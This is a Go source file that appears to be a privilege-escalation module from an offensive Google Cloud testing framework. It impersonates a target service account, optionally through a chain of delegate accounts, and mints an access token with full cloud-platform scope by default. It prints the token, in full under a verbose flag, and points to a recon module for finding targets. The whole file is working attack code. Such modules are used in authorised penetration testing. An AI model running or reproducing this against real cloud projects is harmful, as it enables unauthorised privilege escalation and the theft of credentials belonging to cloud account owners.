package iam

import (
	"context"
	"fmt"

	iamcredentials "google.golang.org/api/iamcredentials/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSAImpersonate{})
}

// EscalateSAImpersonate generates an access token by impersonating a target SA.
type EscalateSAImpersonate struct{}

func (m *EscalateSAImpersonate) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-sa-impersonate",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Generate access token by impersonating a target service account",
		RequiresAuth: true,
		AttackID:     "T1134.001",
	}
}

func (m *EscalateSAImpersonate) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	if targetSA == "" {
		output.Warn("Usage: run privesc.iam.escalate-sa-impersonate --target-sa <email> [--delegates sa1,sa2]")
		output.Info("Tip: run 'recon.iam.list-principals' first to discover service accounts.")
		return nil
	}

	scope := ctx.Flags["scope"]
	if scope == "" {
		scope = "https://www.googleapis.com/auth/cloud-platform"
	}

	svc, err := iamcredentials.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create iamcredentials client: %w", err)
	}

	output.Info("Attempting to impersonate: %s", targetSA)

	var delegates []string
	if d, ok := ctx.Flags["delegates"]; ok {
		for _, del := range splitAndTrim(d) {
			delegates = append(delegates, fmt.Sprintf("projects/-/serviceAccounts/%s", del))
		}
	}

	resp, err := svc.Projects.ServiceAccounts.GenerateAccessToken(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamcredentials.GenerateAccessTokenRequest{
			Scope:     []string{scope},
			Delegates: delegates,
		},
	).Do()
	if err != nil {
		return fmt.Errorf("impersonation failed: %w", err)
	}

	output.Success("Token generated for %s", targetSA)
	output.Info("Expires: %s", resp.ExpireTime)

	if ctx.Verbose {
		fmt.Printf("\n  Access Token: %s\n\n", resp.AccessToken)
	} else {
		output.Info("Token: %s... (use -v to display full token)", resp.AccessToken[:20])
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-sa-impersonate",
			Severity:    module.SevCritical,
			Title:       "Successfully impersonated service account",
			Description: fmt.Sprintf("Generated access token for %s via impersonation", targetSA),
			Resource:    targetSA,
		}
	}

	return nil
}

func splitAndTrim(s string) []string {
	var result []string
	for _, part := range splitComma(s) {
		trimmed := trimSpace(part)
		if trimmed != "" {
			result = append(result, trimmed)
		}
	}
	return result
}

func splitComma(s string) []string {
	var parts []string
	current := ""
	for _, c := range s {
		if c == ',' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		parts = append(parts, current)
	}
	return parts
}

func trimSpace(s string) string {
	start, end := 0, len(s)
	for start < end && (s[start] == ' ' || s[start] == '\t') {
		start++
	}
	for end > start && (s[end-1] == ' ' || s[end-1] == '\t') {
		end--
	}
	return s[start:end]
}
